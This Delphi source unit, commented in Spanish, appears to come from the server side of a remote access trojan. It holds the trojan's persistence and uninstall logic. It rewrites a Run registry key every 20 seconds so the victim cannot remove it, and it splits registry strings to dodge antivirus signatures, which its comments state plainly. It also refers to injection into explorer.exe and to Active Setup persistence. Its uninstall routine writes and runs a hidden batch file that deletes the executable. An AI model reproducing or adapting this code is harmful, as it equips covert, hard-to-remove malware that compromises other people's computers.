unit UnitInstalacion;

interface

uses
  Windows,
  TlHelp32,
  SysUtils,
  ShellApi, 

  UnitVariables,
  
  UnitFileManager,
  UnitRegistro;

  //La funcion instalar está en el conectador :)
procedure Desinstalar();

implementation

function GetProcessID(sProcName: string): integer;
var
  hProcSnap: THandle;
  pe32:      TProcessEntry32;
begin
  Result    := 0;
  hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if hProcSnap = INVALID_HANDLE_VALUE then
    Exit;
  pe32.dwSize := SizeOf(ProcessEntry32);
  if Process32First(hProcSnap, pe32) = True then
    while Process32Next(hProcSnap, pe32) = True do
      if pos(Lowercase(sProcName), Lowercase(pe32.szExeFile)) > 0 then
        Result := pe32.th32ProcessID;
end;

var
  ThreadAutoInicioID: Cardinal;

procedure AutoInicio;
var
  Clave: string;
begin
  while True do
    begin
      //Ahora me agrego al autoinico
      //Metodo policies
      if Configuracion.bArranqueRun then
        begin
          //Separadita para que no se vea la string completa si se abre con un editor hexadecimal.
          //Me imagino que esto ayudara a la indetección de antivirus que usan firmas con strings.
          //Y si no, es por pura diversión :)
          Clave := 'HKEY_CURRENT_';
          Clave := Clave + 'USER\Software\Micro';
          Clave := Clave + 'soft\Windows\Cu';
          Clave := Clave + 'rrentVer';
          Clave := Clave + 'sion\Run';

          Clave := Clave + '\' + Configuracion.sRunRegKeyName;
          AniadirClave(PChar(Clave), ParamStr(0), 'REG_SZ');
        end;
      Sleep(20000); //20 sec
    end;
end;

procedure CrearThreadAutoInicio;
//Crea un nuevo Thread en el que el server se agrega al auto inicio cada 20 segundos, para que no lo puedan borrar :)
begin
  BeginThread(nil, 0, @AutoInicio, nil, 0, ThreadAutoInicioID);
end;

function TerminarThreadAutoInicio: Boolean;
//Cierra el thread
begin
  Result := False;
  if ThreadAutoInicioID > 0 then
    begin
      EndThread(ThreadAutoInicioID);
      Result := True;
    end;
end;

procedure Desinstalar();
var
  Clave: string;
  PID: DWord;
  H : THandle;
  i : integer;
  DeleteBat: TextFile;
begin
  {
  Tendremos varios tipos de desinstalación:
    1:- No estamos Copiados
    2:- Estamos copiados
      2:1- Estamos inyectados
        2:1:1- Estamos inyectados con persistencia
        2:1:2- Estamos inyectados sin persistencia
      2:2- No estamos inyectados

    1-. Simplemente saldremos del proceso
    2.1.1-. Como tenemos persistencia tenemos que cerrar el thread de explorer.exe
    2.1.2-. Como no tenemos persistencia tenemos que borrar el archivo de instalacion
    2.2- Tenemos que auto-borrarnos inyectando un thread en otro proceso
  }
  
  if Configuracion.bArranqueRun then //Eliminar la clave RUN
  begin
    //Separadita para que no se vea la string completa si se abre con un editor hexadecimal.
    //Me imagino que esto ayudara a la indetección de antivirus que usan firmas con strings.
    //Y si no, es por pura diversión :)
    Clave := 'HKEY_CURRENT_';
    Clave := Clave + 'USER\Software\Micro';
    Clave := Clave + 'soft\Windows\Cu';
    Clave := Clave + 'rrentVer';
    Clave := Clave + 'sion\Run';
    Clave := Clave+'\'+ Configuracion.sRunRegKeyName;
    BorraClave(Clave);
  end;

  if(Configuracion.bArranqueActiveSetup) then //Eliminar la clave active setup
  begin
    Clave := 'HKEY_CURRENT_USER\Softw';
    Clave := Clave + 'are\Microsoft\Ac';
    Clave := Clave + 'tive Setup\In';
    Clave := Clave + 'stalled Components\';
    Clave := Clave + Configuracion.sActiveSetupKeyName+'\';
    BorraClave(Clave);
  end;

  //En esta clave se guarda el nombre del server cuando se cambia desde el cliente
  Clave := 'HKEY_CURRENT_USER\Software\' + Configuracion.sID+'\';
  BorraClave(Clave);

  
  if not Configuracion.bCopiarArchivo then  //1
  begin
    {No hacemos absolutamente nada :p}
  end
  else
  begin
    if Configuracion.sInyectadorFile <> '' then  //Inyección activada
    begin
      for i := 0 to 9 do  //10 veces por si acaso :p => 1 seg
      begin
        sleep(100);
        BorrarArchivo(Configuracion.sCopyTo + Configuracion.sFileNameToCopy);
      end;
    end
    else   //Sin inyección
    begin
    //Borrarse a si mismo... con un bat
  //Primero me quito los permisos readonly, oculto y de sistema para que el bat me pueda borrar
  try
  //saco atributos para poder borrar un archivo sin importar que sea oculto, solo lectura o de sistema
    i := GetFileAttributes( PChar(ParamStr(0)) );
    i := i and $00000002;//faHidden;
    i := i and $00000001;//faReadOnly;
    i := i and $00000004;//faSysFile;
    if SetFileAttributes(PChar(ParamStr(0)), i) then
    //si logro sacar los atributos entonces crea el bat que lo borra el server y se borra a si mismo
    //de lo contrario solo me suicido, y quedará el archivo del servver pero no corriendo
    begin
    AssignFile(DeleteBat, ExtractFileDir(ParamStr(0)) + '\Uninstall.bat');
    Rewrite(DeleteBat);
    WriteLn(DeleteBat,'@ECHO OFF');
    WriteLn(DeleteBat, ':LOOP');
    WriteLn(DeleteBat, 'del %1');
    WriteLn(DeleteBat, 'ping google.com'); //Para que no consuma tanta CPU en el caso de que no consiga borrarlo
    WriteLn(DeleteBat, 'if exist %1 goto LOOP');
    WriteLn(DeleteBat, 'del %0');
    WriteLn(DeleteBat, 'exit');
    CloseFile(DeleteBat);
    ShellExecute(GetForegroundWindow(), 'open', PChar(ExtractFileDir(ParamStr(0)) + '\Uninstall.bat'), PChar(ParamStr(0)), PChar(ExtractFileDir(ParamStr(0))), SW_HIDE);
    end;
  except
     end;
      end;
    end;


  ExitProcess(7); //Este exit-code indicará (cuando este programado :p) al thread de explorer.exe que nos hemos desinstalado para que finalice
end;

end.
